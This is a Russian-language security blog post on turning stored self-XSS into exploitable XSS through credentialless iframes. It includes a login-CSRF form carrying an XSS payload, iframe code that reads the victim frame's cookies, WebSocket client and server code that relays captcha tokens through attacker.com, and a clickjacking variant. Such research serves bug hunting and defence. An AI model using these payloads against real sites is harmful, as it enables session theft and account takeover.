+++
title = 'Make Self-XSS Great Again'
date = 2025-06-08T00:00:00+03:00
draft = false
+++

> The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.

# Introduction
Думаю многим знакомо то ощущение, когда ты нашел XSS, но она треубет слишком сложных действий внутри аккаунта, т.е. фактически воспроизводится только на аккаунте атакующего из-за чего теряется весь смысла атаки. Думаю многие по началу своей багхантерской карьеры получали подобный ответ в результате общения с командой триажа:
![](./1.png)

Целью сегоднешней статьи является попытка обьяснить, что фактически то что люди воспринимают как `Stored Self-XSS` является обычной `Stored XSS` благодаря современным возможностям браузеров.

# Credentialless эпоха

Ключевой проблемой таких уязвимостей является следующая делема:
1. Чтобы полезная XSS нагрузка отработала, нам нужно войти в аккаунт атакующего
2. Если мы войдем в аккаунт атакующего - атака потеряет весь смысл, ведь мы будем находиться в сессии атакующего и потеряем доступ к оригинальной сессии.

Однако такой подход является устарелым, и причиной этого является [сredentialless iframe](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless)

>  This results in the documents inside the credentialless `<iframe>` being loaded using new, ephemeral contexts — those contexts don't have access to the data associated with their origins

Фактически это означает что если мы откроем html с таким содержанием:
```html
   <iframe src="http://victim.domain/" width="40%" height="500px" credentialless></iframe>
   <iframe src="http://victim.domain/" width="40%" height="500px"></iframe>
```
то увидим следующее:
![](./2.png)

Однака данная функциональность плохо описана и фраза `those contexts don't have access to the data associated with their origins` может ввести в заблуждение.

Если мы посмотрим в [RFC](https://wicg.github.io/anonymous-iframe/#alternatives-opaque-origins), то увидим что credentialles iframe является same-origin, с обычным iframe (Написано что реализация opaque-origins на подобии той что применяется в sandbox доменах не была реализована из-за трудностей имплементации):
```
The credentialless iframes model that we propose relies on partitioned storage (see explainer), using a nonce in the storage key. We have also considered attributing opaque origins to the credentialless iframes, similar to sandboxed iframes. This would ensure that the credentialless iframes do not have access to existing credentials and shared storage since their origin has been changed to an opaque one.

This solution runs into compatibility issues:
...
```

#  Credentialless same-origin issue

Но что же нам дает факт того, что credentialess iframe является same-origin, с обычным iframe?
Допустим у нас есть следующая страница:
```html
<iframe src="https://neplox.security/xss_page_url" width="20%" height="20%" credentialless></iframe>
<iframe src="https://neplox.security/"></iframe>
```
Факт в том что если `/xss`, выполнить следующий код:
```js
window.top[1].document.body.innerHTML = 'Hi from credentialess';
alert(window.top[1].document.cookie);
```
То получит доступ к оригинальным кукам, страницы:
![](./3.png)

# SELF-XSS + CSRF on login 
Допустим, вы нашли Stored SELF-XSS, один из реальных примеров на моей практике выглядел как-то так:
![](./4.png)

На домашней странице отоброжалась надпись `Welcome, username!`, где username не санитизировался, соотвественно туда можно было вставить любой XSS payload. То есть у нас имеется классический пример Self-XSS.

После этого стоит обратить внимание на форму `/login`, и если в ней будет отсутсвовать CSRF защита, тогда вы можете сделать следующее:
1. Сформировать классический CSRF login form
   ```html
   <html>
  <body>
    <form action="http://victim.domain/login" method="POST">
      <input type="hidden" name="username" value="attacker_username<img src=x onerror=eval(window.name)>" />
      <input type="hidden" name="password" value="Super_s@fe_password" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
2. Сформировать направить человека которого мы атакуем на следующую страницу:
   ```html
<iframe name="alert('Our cookie is: ' + document.cookie + '\nVictim cookie is: ' + window.top[1].document.cookie)" src="http://localhost:3004/" width="40%" height="500px" credentialless></iframe>
<iframe src="http://localhost:3004/" width="40%" height="500px"></iframe>
```

3. (Optional) Перенаправить пользователя в credentialless iframe на url который триггерит SELF.XSS, который в свою очередь выполнит нужные действия (кража сессии/ATO) внутри `window.top[1]`. Тут вам может быть полезен факт того что все credentialess frames внутри одного документа. То есть если вы уже имеете на странице `<iframe src=//example.com credentialless>`, который выставил внутри себя например `cookie` и `localStorage`. То добавив на страницу `<iframe src=//example.com/path1 credentialless>`, он будет иметь те же самые данные хранилища, что и первый `credentialless` frame.

В нашем случае это будет выглядеть примерно так:
![](./5.jpg)
Как можно заметить, мы успешно получили `alert()` с значением обоих cookie (атакующего и атакуемого). Чтобы просто выполнять действия внутри frame с credentials жертвы - вызовите `window.top[1].eval('your code')`

# SELF-XSS + CSRF on login with Captcha
Так же иногда вы можете наткнуться на случай, того что CSRF на форме логина отсутсвует, но присутсвует капча. На самом деле такая ситуация не сильно усложняет эксплойт. Ключевым моментом тут является то, что капча это не механизм защиты от CSRF, так как у вас нет гарантии что капча была пройдена на том же устройстве что и отправлена.

Фактически в таких случаях вы можете просто добавить пункт получения каптчи в атаку из предыдущего пункта, простая реализация на уровне клиента:
```js
const ws = new WebSocket('ws://attacker.com:3004');
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'visited' }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  if (data.type === 'captcha') {
    captchaInput.value = data.captchaToken;
  }
};
```
И на уровне сервера:
```js
const WebSocket = require('ws');
const readline = require('readline');

const wss = new WebSocket.Server({ port: 3004 });

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('WebSocket server is running on port 3004');
wss.on('connection', (ws) => {
    console.log('New client connected');
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        if (data.type === 'visited') {
            console.log('Client sent visited message');
            rl.question('Enter captcha token: ', (token) => {
                ws.send(JSON.stringify({
                    type: 'captcha',
                    captchaToken: token
                }));
            });
        }
    });

    ws.on('close', () => {
        console.log('Client disconnected');
    });
}); 
```
Это простой пример, когда пользователь зайдет на сайт, нам придет запрос и в консоль нужно будет ввести токен капчи(Например перехватив её вручную через proxy). Очевидно, что для реальных атак можно написать более сложную логику, это я вставил для демонстрации одного из способов как это моежт быть реализовано.

# SELF-XSS + Clickjacking
Но допустим, нам недоступен login CSRF, тогда можно воспользоваться Clickjacking.
Основная идея кажется мне очень забавной - с помощью clickjacking мы должны заставить пользователя ввести свои данные в форме авторизации (Фактически это полностью обратная ситуация от классических векторов, где люди пытаются социальной инженерией заставить пользователя ввести данные в форму атакующего)

Я не силен в таких вещах, но это может выглядеть примерно так:
1. Пользователь заходит на сайт атакующего и просит доступ на сайт
   ![](./6.png)
2. Пользователю приходит email, с примерно таким содержимым:
   ![](./7.png)
3. Пользователь переходит на сайт атакующего и логинится с этими данными, но вместо того чтобы вводить данные в форму на сайте атакующего он будет вводить данные в форму на сайте `victim.com`. (Просто вставте credentialess form с overlay вокруг с вашего сайта. Описывать как делать Clickjacking не является частью этой статьи)

Тут стоит заметить что для пользователя все будет выглядеть валидно, так как он будет вводить данные которые ему выслали с сайта `attacker.com` на этом же сайте. Вряд ли обычный пользователь задумается о том, что сейчас атакующий через clickjacking направляет его в свой аккаунт для проведения атаки.

# Заключение
Фактически в современных браузерах благодаря credentialless frames можно превратить любой Stored Self-XSS в обычную XSS. Правда зачастую это все равно будет требовать минимальный User Interaction.